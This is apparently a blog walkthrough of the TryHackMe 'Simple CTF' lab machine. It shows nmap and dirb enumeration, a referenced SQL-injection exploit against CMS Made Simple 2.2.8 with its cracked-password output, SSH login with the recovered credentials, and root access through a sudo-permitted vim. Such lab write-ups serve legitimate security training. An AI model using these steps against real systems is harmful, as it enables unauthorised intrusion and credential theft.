---
title: "Simple CTF machine on THM"
classes: wide
header:  
  teaser: /assets/images/posts/writeups/simple_ctf.jpg
  #overlay_image: /assets/images/main/header3.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "A beginner level CTF with a twist. The configuration leave room for errors, keep an eye on the CMS used."
description: "Walkthrough on Simple CTF machine from TryHackMe"
categories:
  - writeups
tags:
  - Simple
  - CMS
  - THM
  - CTF
  - mysql
  - writeup
  - TryHackMe
  - Easy
toc: false
---
# Simple CTF

<img src="/assets/images/posts/writeups/simple_ctf.jpg" alt="Simple_Ctf" width="500" class="align-center">

A beginner level CTF with a twist. The configuration leave room for errors, keep an eye on the CMS used.

## Information gathering

### Enumeration

#### Nmap

Command:
```sh
nmap -sC -sV 10.10.169.41
```

Results
```sh
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can\'t get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.35.41
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Since port 1000 is not displayed a new scan is needed: add UDP (-sU) and TCP SYN scan (-sS) plus specific port number

Command:
```sh
sudo nmap -sS -sV -sU -p 1000 10.10.169.41
```

Results
```sh
PORT     STATE         SERVICE VERSION
1000/tcp filtered      cadlock
1000/udp open|filtered ock
```

#### Dirb

Command:
```sh
dirb http://10.10.169.41/ -w /usr/share/wordlists/dirb/common.txt
```

Results
```sh
---- Scanning URL: http://10.10.169.41/ ----
+ http://10.10.169.41/index.html (CODE:200|SIZE:11321)
+ http://10.10.169.41/robots.txt (CODE:200|SIZE:929)
+ http://10.10.169.41/server-status (CODE:403|SIZE:300)
==> DIRECTORY: http://10.10.169.41/simple/
---- Entering directory: http://10.10.169.41/simple/ ----
==> DIRECTORY: http://10.10.169.41/simple/admin/
==> DIRECTORY: http://10.10.169.41/simple/assets/
==> DIRECTORY: http://10.10.169.41/simple/doc/
+ http://10.10.169.41/simple/index.php (CODE:200|SIZE:19913)
==> DIRECTORY: http://10.10.169.41/simple/lib/
==> DIRECTORY: http://10.10.169.41/simple/modules/
==> DIRECTORY: http://10.10.169.41/simple/tmp/
==> DIRECTORY: http://10.10.169.41/simple/uploads/   
```

## Exploitation

### Foothold
1. Checking the link  http://10.10.169.41/simple/ leads to an application called CMS made simple v 2.2.8 
2. Application is vulnerable to SQLi https://www.exploit-db.com/exploits/46635
3. Use the python script to exploit the vulnerability found you will get
``` sh
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

#### Data exfiltration

1. Using user *mitch* and password *secret* connect to SSH custom port (2222) found with nmap
``` sh
ssh mitch@10.10.108.231 -p 2222
```
2. Get user fag: *[UserFlag]*

### Privilege escalation
1. Check sudo privileges
``` sh
sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

#### Data exfiltration
1. Using the upper privileged vim you can get the root flag
``` sh
sudo /usr/bin/vim /root/root.txt
```